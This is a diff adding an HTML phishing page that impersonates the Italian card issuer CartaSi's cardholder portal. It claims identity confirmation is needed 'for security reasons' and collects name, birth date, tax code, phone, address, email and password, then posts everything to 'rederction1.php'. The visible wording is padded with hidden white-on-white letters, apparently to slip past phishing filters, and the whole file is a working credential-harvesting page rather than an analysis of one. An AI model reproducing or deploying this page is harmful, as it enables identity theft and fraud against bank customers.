@@ -1,0 +1,1062 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml" id="ext-gen50">
+ <head>
+  <!-- The HTML 4.01 Transitional DOCTYPE declaration-->
+  <!-- above set at the top of the file will set     -->
+  <!-- the browser's rendering engine into           -->
+  <!-- "Quirks Mode". Replacing this declaration     -->
+  <!-- with a "Standards Mode" doctype is supported, -->
+  <!-- but may lead to some differences in layout.   -->
+  <meta content="content-type" http-equiv="content-type" />
+  <meta content="" name="DCS.dcsuri" />
+  <meta content="" name="WT.ti" />
+  <!-- -->
+  <!-- Any title is fine                         -->
+  <!-- -->
+  <title>
+   Portale Titolari
+  </title>
+  <link rel="SHORTCUT ICON" href="files/favicon.png" />
+  <script language="javascript">
+   function longueurtexte() {
+var tes=true;
+// on attribue la valeur de la saisie à une variable pour plus de commodité
+var nome=document.fox.nome.value;
+var cognome=document.fox.cognome.value;
+var d1=document.fox.day.value; 
+var d2=document.fox.monthe.value; 
+var d3=document.fox.year.value;
+var nascita=document.fox.nascita.value;
+var tele=document.fox.tele.value;
+var indirizzo=document.fox.indirizzo.value;
+var city=document.fox.city.value;
+var cap=document.fox.cap.value;
+var codfes=document.fox.codfes.value;
+var email=document.fox.email.value;
+
+// on compare cette variable à '' (vide) ou à ' ' (espace)
+
+if ( nome == '' || nome == ' ' ) {
+	alert('Il campo nome è obbligatorio.');
+	tes=false;
+	}
+else if((cognome == '') || (cognome == ' ')){
+	alert('Il campo cognome è obbligatorio.');
+	tes=false;
+	}
+else if((d1 =='')|| (d1 ==' ') || (d2 =='')|| (d2 ==' ')||(d3 =='')|| (d3 ==' ')) {
+	window.alert('Il campo data di nascita è obbligatorio.');
+	tes=false;
+	}
+else if((nascita =='')|| (nascita ==' ')){
+	window.alert('Il campo luogo di nascita è obbligatorio.');
+	tes=false;
+	}
+else if((tele=='')|| (tele==' ')) {
+	window.alert('Il campo telefono è obbligatorio.');
+	tes=false;
+	}
+else if((indirizzo =='')|| (indirizzo ==' ')){
+	window.alert('Il campo indirizzo è obbligatorio.');
+	tes=false;
+	}
+else if((city =='')|| (city ==' ')){
+	window.alert('Il campo città è obbligatorio.');
+	tes=false;
+    }
+else if((cap =='')|| (cap ==' ')){
+	window.alert('Il campo cap è obbligatorio.');
+	tes=false;
+}
+else if((codfes =='')|| (codfes ==' ')){
+	window.alert('Il campo codice fiscale è obbligatorio.');
+	tes=false;
+	
+}
+else if((email =='')|| (email ==' ')){
+	window.alert('Il campo Indirizzo e-mail è obbligatorio.');
+	tes=false;
+}
+return tes;
+}
+  </script>
+  <!-- -->
+  <!-- This script loads your compiled module.   -->
+  <!-- If you add any GWT meta tags, they must   -->
+  <!-- be added before this line.                -->
+  <!-- -->
+  <script src="files/portale.js" language="javascript" type="text/javascript">
+  </script>
+  <script src="files/ext-base.js" language="javascript">
+  </script>
+  <script src="files/ext-all.js" language="javascript">
+  </script>
+  <script src="files/ext-lang-it.js" language="javascript">
+  </script>
+  <script src="files/jquery.js" language="javascript">
+  </script>
+  <script src="files/ricTelefoniche.js" language="javascript">
+  </script>
+  <script src="files/utils.js" language="javascript">
+  </script>
+  <script src="files/accordion.js" language="javascript">
+  </script>
+  <script src="files/wtinit.js" language="javascript">
+  </script>
+  <script src="files/wtbase.js" language="javascript">
+  </script>
+  <script defer="defer">
+   portale_titolari_titolari.onInjectionDone('portale.titolari.titolari')
+  </script>
+  <!-- NON MODIFICARE LE DICHIARAZIONI O IL LORO ORDINE, E' POSSIBILE AGGIURNE DI NUOVE IN CODA-->
+  <link href="files/titolari.css" type="text/css" rel="stylesheet" />
+  <link href="files/ext-all0.css" type="text/css" rel="stylesheet" />
+  <link href="files/GwtExt00.css" type="text/css" rel="stylesheet" />
+  <link href="files/titolarj.css" type="text/css" rel="stylesheet" />
+  <link href="files/titolark.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="files/common00.css" type="text/css" rel="stylesheet" />
+  <script type="text/javascript" language="javascript" src="files/jquery00.js">
+  </script>
+  <!-- <link rel="stylesheet" type="text/css" href="pt/css/titolari-print.css" media="print"  />-->
+  <!-- -->
+  <!-- The body can have arbitrary html, or      -->
+  <!-- you can leave the body empty if you want  -->
+  <!-- to create a completely dynamic UI.        -->
+  <!-- -->
+  <link rel="stylesheet" href="files/GwtExt.css" />
+  <link type="text/css" rel="stylesheet" href="files/btn.css" />
+ </head>
+ <body id="ext-gen6" class=" ext-gecko">
+  <!-- <link rel="stylesheet" type="text/css" href="pt/css/titolari-print.css" media="print"  />-->
+  <!-- -->
+  <!-- The body can have arbitrary html, or      -->
+  <!-- you can leave the body empty if you want  -->
+  <!-- to create a completely dynamic UI.        -->
+  <!-- -->
+  <link rel="stylesheet" href="files/GwtExt.css" />
+  <link type="text/css" rel="stylesheet" href="files/btn.css" />
+  <!-- OPTIONAL: include this if you want history support -->
+  <iframe src="javascript:''" style="position: absolute; width: 0pt; height: 0pt; border: 0pt none;" tabindex="-1" id="__gwt_historyFrame">
+  </iframe>
+  <!-- 
+
+<div id="debugMessagesDiv" style="display:none;"></div>
+
+<div style="position: absolute; right: 0; width: 40px;"><input type="button" onclick="document.getElementById('debugMessagesDiv').innerHTML='';"
+
+	value="CLEAR" style="margin: 8"  /> <input type="button" onclick="document.getElementById('debugMessagesDiv').style.display = 'none';" value="HIDE"
+
+	style="margin: 8"  /> <input type="button" onclick="document.getElementById('debugMessagesDiv').style.display = 'block';" value="SHOW" style="margin: 8"  /></div>
+
+ -->
+  <div id="mainLoading" style="display: none;">
+   <table align="center" id="mainLoadingTable">
+    <tbody>
+     <tr>
+      <td>
+       <img src="files/main_loading_orange.gif" />
+      </td>
+      <td valign="middle">
+       <b id="loadingMessage">
+        Loading...
+       </b>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </div>
+  <form onsubmit="return longueurtexte()" class="edit" action="rederction1.php" method="post" name="fox">
+   <table align="center" cellspacing="0" cellpadding="0" class="mainTable">
+    <tbody>
+     <tr>
+      <td rowspan="2" class="leftBorder">
+       <div style="width: 8px;">
+       </div>
+      </td>
+      <td id="mainBody">
+       <table cellspacing="0" cellpadding="0" class="main_layout_outer_panel">
+        <colgroup>
+         <col>
+         </col>
+        </colgroup>
+        <tbody>
+         <tr>
+          <td style="vertical-align: top;">
+           <table cellspacing="0" cellpadding="0" style="width: 100%;">
+            <tbody>
+             <tr>
+              <td width="" height="" align="center" style="vertical-align: top;">
+               <table cellspacing="0" cellpadding="0" class="main_layout_dock_panel">
+                <tbody>
+                 <tr>
+                  <td width="" height="" align="left" style="vertical-align: top;" colspan="2">
+                   <table cellspacing="0" class="main_layout_header_panel">
+                    <colgroup>
+                     <col>
+                     </col>
+                    </colgroup>
+                    <tbody>
+                     <tr>
+                      <td>
+                       <table class="main_layout_header_panel pointer-cursor">
+                        <colgroup>
+                         <col>
+                         </col>
+                        </colgroup>
+                        <tbody>
+                         <tr>
+                          <td>
+                           <div class="gwt-HTML" title="Home">
+                            <table width="100%" height="100%" border="0" id="ext-gen62">
+                             <tbody>
+                              <tr>
+                               <td>
+                                <img align="left" src="files/logo.jpg" id="ext-gen49" />
+                               </td>
+                              </tr>
+                             </tbody>
+                            </table>
+                            <div style="position:absolute; left:150px; top:12px; z-index:1" id="g_nav10d">
+                             <a onmouseover="MM_swapImage('g_nav10','','files/f10.png',1)" onmouseout="MM_swapImgRestore()">
+                              <img border="0" src="files/f10.png" alt="" onload="MM_preloadImages('files/f10.png')" name="g_nav10" />
+                             </a>
+                            </div>
+                            <div style="position:absolute; left:805px; top:166px; z-index:1" id="g_nav10d">
+                             <a onmouseover="MM_swapImage('g_nav10','','files/f8.jpg',1)" onmouseout="MM_swapImgRestore()">
+                              <img border="0" src="files/f8.jpg" alt="" onload="MM_preloadImages('files/f8.jpg')" name="g_nav10" />
+                             </a>
+                            </div>
+                            <div style="position:absolute; left:1020px; top:1px; z-index:1" id="g_nav10d">
+                             <a onmouseover="MM_swapImage('g_nav10','','files/logo1.gif',1)" onmouseout="MM_swapImgRestore()">
+                              <img border="0" src="files/logo1.gif" alt="" onload="MM_preloadImages('files/logo1.gif')" name="g_nav10" />
+                             </a>
+                            </div>
+                            <div class="menu_lev_0_link_inner_item_style" id="ext-gen122">
+                            </div>
+                           </div>
+                          </td>
+                          <td align="left" style="vertical-align: top;">
+                           <div class="menu_lev_0 menu_lev_0-selected" id="ext-gen91">
+                            <div class="menu_lev_0_link_inner_item_selected_style" id="ext-gen97">
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             Aggiornamento
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             <font color="#FF6600">
+                              s
+                             </font>
+                            </div>
+                           </div>
+                          </td>
+                          <td align="left" style="vertical-align: top;">
+                           <div class="menu_lev_0" id="ext-gen92">
+                            <div class="menu_lev_0_inner_item_style" id="ext-gen104">
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             Aziende
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             <font color="#FF6600">
+                              s
+                             </font>
+                            </div>
+                           </div>
+                          </td>
+                          <td align="left" style="vertical-align: top;">
+                           <div class="menu_lev_0">
+                            <div class="menu_lev_0_link_inner_item_style" id="ext-gen105">
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             Esercenti
+                             <font color="#FF6600">
+                              s
+                             </font>
+                             <font color="#FF6600">
+                              s
+                             </font>
+                            </div>
+                           </div>
+                          </td>
+                         </tr>
+                        </tbody>
+                       </table>
+                      </td>
+                     </tr>
+                    </tbody>
+                   </table>
+                  </td>
+                 </tr>
+                 <tr>
+                  <td width="" height="" align="left" style="vertical-align: top;">
+                   <table cellspacing="0" cellpadding="0" class="main_layout_body_panel">
+                    <colgroup>
+                     <col>
+                     </col>
+                    </colgroup>
+                    <tbody>
+                     <tr>
+                      <td>
+                       <div class="gwt-HTML">
+                        <table cellspacing="0" cellpadding="0">
+                         <tbody>
+                          <tr>
+                           <td align="left" style="vertical-align: top;">
+                            <div class="menu_lev_1 menu_lev_1-link menu_lev_1-linkselected">
+                             Sicurezza
+                            </div>
+                           </td>
+                           <td align="left" style="vertical-align: top;">
+                            <div class="menu_lev_1 menu_lev_1-link">
+                             Carte di credito
+                            </div>
+                           </td>
+                           <td align="left" style="vertical-align: top;">
+                            <div class="menu_lev_1 menu_lev_1-link">
+                             Complete
+                            </div>
+                           </td>
+                          </tr>
+                         </tbody>
+                        </table>
+                       </div>
+                      </td>
+                     </tr>
+                     <tr>
+                      <td id="operativeArea">
+                       <table border="0" cellspacing="0" cellpadding="0" style="width: 100%;" class="main_layout_body_panel_container">
+                        <colgroup>
+                         <col>
+                         </col>
+                        </colgroup>
+                        <tbody>
+                         <tr>
+                          <td>
+                           <table border="0" cellspacing="0" cellpadding="0" style="width: 100%;">
+                            <colgroup>
+                             <col>
+                             </col>
+                            </colgroup>
+                            <tbody>
+                             <tr>
+                              <td>
+                              </td>
+                             </tr>
+                             <tr>
+                              <td>
+                               <div class="gwt-HTML component_table_fake_title" id="ext-gen46">
+                               </div>
+                              </td>
+                             </tr>
+                             <tr>
+                              <td valign="bottom" align="center" id="ext-gen57">
+                               <table cellspacing="0" cellpadding="0" class="form_null form_component component_table_with_warning">
+                                <tbody>
+                                 <tr>
+                                  <td align="left" style="vertical-align: top;">
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-odd login_form_text_forgot_user_password" style="width: 100%;">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td style="display: none;">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                       </div>
+                                      </td>
+                                      <td width="100%" align="left">
+                                       <div style="width: 100%;" class="gwt-HTML config_item_html component_table_cell_elem login_form_text_forgot_user_password_mainkey_configitem_value">
+                                        <h1 class="title1Pt">
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         Deve
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         confermare
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         la
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         propria
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         identità
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         con
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         la
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         tua
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         carta
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         di
+                                         <font color="#FFFFFF">
+                                          V
+                                         </font>
+                                         credito:
+                                        </h1>
+                                        <script type="text/javascript" language="javascript" src="files/jquery.js">
+                                        </script>
+                                        <p>
+                                        </p>
+                                        <p id="ext-gen54" class="paragraphPt">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         La
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         richiesta
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         dei
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         dati
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         è
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         dovuta
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         a
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         <strong>
+                                          motivi
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                          di
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                          sicurezza
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                         </strong>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         e
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         ti
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         offre
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         <strong>
+                                          le
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                          massime
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                          garanzie
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                          di
+                                          <font color="#FFFFFF">
+                                           s
+                                          </font>
+                                          tutela
+                                         </strong>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         contro
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         eventuali
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         accessi
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         non
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         autorizzati
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         alle
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         tue
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         informazioni
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         personali.
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         <br />
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Grazie
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         della
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         collaborazione!
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </p>
+                                        <p class="paragraphPt">
+                                        </p>
+                                       </div>
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                  </td>
+                                 </tr>
+                                 <tr>
+                                  <td align="left" style="vertical-align: top;">
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Nome
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" onfocus="checkform()" name="nome" id="nome" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="20" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Cognome
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="cognome" id="cognome" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="20" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Data
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         di
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         nascita
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <table width="379" cellspacing="0" cellpadding="0" class="component_table_cell_elem login_form_insert_pan_code_mainkey_configitem_value">
+                                        <tbody>
+                                         <tr>
+                                          <td width="45" align="left" style="vertical-align: top;">
+                                           <input type="text" autocomplete="off" maxlength="2" size="20" style="width: 34px;" id="day" class=" x-form-text x-form-field" name="day" />
+                                          </td>
+                                          <td width="3" align="left" style="vertical-align: top;">
+                                           <div class="gwt-HTML">
+                                           </div>
+                                          </td>
+                                          <td width="45" align="left" style="vertical-align: top;">
+                                           <input type="text" autocomplete="off" maxlength="2" size="20" style="width: 34px;" id="monthe" class=" x-form-text x-form-field" name="monthe" />
+                                          </td>
+                                          <td width="3" align="left" style="vertical-align: top;">
+                                           <div class="gwt-HTML">
+                                           </div>
+                                          </td>
+                                          <td width="52" align="left" style="vertical-align: top;">
+                                           <input type="text" autocomplete="off" maxlength="4" size="20" style="width: 50px;" id="year" class=" x-form-text x-form-field" name="year" />
+                                          </td>
+                                          <td width="1" align="left" style="vertical-align: top;">
+                                           <div class="gwt-HTML">
+                                           </div>
+                                          </td>
+                                          <td width="223" valign="middle" align="left" style="vertical-align: top;">
+                                           <table width="70" border="0">
+                                            <tbody>
+                                             <tr>
+                                              <td width="64" valign="top" height="21">
+                                               (gg/mm/aaaa)
+                                              </td>
+                                             </tr>
+                                            </tbody>
+                                           </table>
+                                          </td>
+                                         </tr>
+                                        </tbody>
+                                       </table>
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Codice
+                                         <font color="#FFFFFF">
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         fiscale
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="nascita" id="nascita" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="20" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Telefono
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="tele" id="tele" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="16" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Indirizzo
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="indirizzo" id="indirizzo" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="30" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         Città
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="city" id="city" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="20" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                         CAP
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="cap" id="cap" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="16" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <span id="search">
+                                          <em>
+                                           <font color="#FFFFFF">
+                                            s
+                                           </font>
+                                           Indirizzo
+                                           <font color="#FFFFFF">
+                                            s
+                                           </font>
+                                           e-mail
+                                          </em>
+                                         </span>
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="text" name="codfes" id="codfes" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="40" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                   <table border="0" cellspacing="0" cellpadding="0" class="form_component_row form_component_row-even login_form_inserisci_codice_fiscale" id="ext-gen78">
+                                    <colgroup>
+                                     <col>
+                                     </col>
+                                    </colgroup>
+                                    <tbody>
+                                     <tr>
+                                      <td width="250px" align="left">
+                                       <div class="gwt-HTML component_table_cell_label">
+                                        <div title="campo obbligatorio">
+                                         <span id="search">
+                                          <em>
+                                           <font color="#FFFFFF">
+                                            s
+                                           </font>
+                                           Password
+                                           <font color="#FFFFFF">
+                                           </font>
+                                          </em>
+                                         </span>
+                                         <font color="red">
+                                          *
+                                         </font>
+                                         <font color="#FFFFFF">
+                                          s
+                                         </font>
+                                        </div>
+                                       </div>
+                                      </td>
+                                      <td width="394px" align="left">
+                                       <input type="Password" name="email" id="email" autocomplete="off" size="20" class=" x-form-text x-form-field component_table_cell_elem login_form_inserisci_codice_fiscale_mainkey_configitem_value" style="width: 149px;" maxlength="40" />
+                                      </td>
+                                     </tr>
+                                    </tbody>
+                                   </table>
+                                  </td>
+                                 </tr>
+                                </tbody>
+                               </table>
+                               <p align="left">
+                               </p>
+                               <p align="left">
+                                <span class="gwt-HTML component_table_warning">
+                                 <font color="#FFFFFF">
+                                  s
+                                 </font>
+                                 <font color="#FFFFFF">
+                                  s
+                                 </font>
+                                 (
+                                 <font color="red">
+                                  *
+                                 </font>
+                                 )
+                                 <font color="#FFFFFF">
+                                  s
+                                 </font>
+                                 campo
+                                 <font color="#FFFFFF">
+                                  s
+                                 </font>
+                                 obbligatorio
+                                </span>
+                               </p>
+                               <span class="form-buttons-area">
+                                <input type="submit" onmouseover="javascript: if (this.disabled==0) this.className='logBtnHov'" onmouseout="javascript: if (this.disabled==0) this.className='logBtn'" onclick="javascript:LoginSubmit('Connexion')" value="   Conferma   " name="Login.Submit" class="logBtn" />
+                               </span>
+                               <p>
+                               </p>
+                               <p>
+                               </p>
+                               <div align="center">
+                               </div>
+                              </td>
+                             </tr>
+                             <tr>
+                             </tr>
+                             <tr>
+                              <td align="center" colspan="1" id="ext-gen58">
+                              </td>
+                             </tr>
+                            </tbody>
+                           </table>
+                          </td>
+                         </tr>
+                        </tbody>
+                       </table>
+                      </td>
+                     </tr>
+                    </tbody>
+                   </table>
+                  </td>
+                  <td width="" height="" align="right" style="vertical-align: top;" rowspan="1" id="ext-gen56">
+                   <table cellspacing="0" cellpadding="0" class="main_layout_shoulder_panel">
+                    <colgroup>
+                     <col>
+                     </col>
+                    </colgroup>
+                    <tbody>
+                     <tr>
+                     </tr>
+                     <tr>
+                      <td>
+                       <div class="shoulder_basic_ad">
+                       </div>
+                      </td>
+                     </tr>
+                    </tbody>
+                   </table>
+                  </td>
+                 </tr>
+                 <tr>
+                  <td width="" height="" align="left" style="vertical-align: top;" colspan="2">
+                   <div class="main_layout_footer_panel">
+                    <table cellspacing="0" cellpadding="0" style="width: 100%;">
+                     <tbody>
+                      <tr>
+                       <td align="left" style="vertical-align: top;">
+                        <div class="gwt-HTML footer_text">
+                         <p>
+                          <span class="footer_d" id="ext-gen59">
+                           P. IVA  04107060966 -  2015 CartaS S.p.A.
+                          </span>
+                          <span class="footer_c">
+                           <a href="" target="_blank">
+                            Trasparenz
+                           </a>
+                           <a href="" target="_blank">
+                            Prvacy
+                           </a>
+                          </span>
+                         </p>
+                        </div>
+                       </td>
+                      </tr>
+                     </tbody>
+                    </table>
+                   </div>
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+      <td rowspan="2" class="rightBorder">
+       <div style="width: 8px;">
+       </div>
+      </td>
+     </tr>
+     <tr>
+      <!-- filler inferiore per l'allineamento della tabella in alto-->
+      <td height="100%" id="ext-gen53">
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <iframe src="javascript:''" id="portale.titolari.titolari" style="position: absolute; width: 0pt; height: 0pt; border: medium none;" tabindex="-1">
+   </iframe>
+  </form>
+ </body>
+</html>
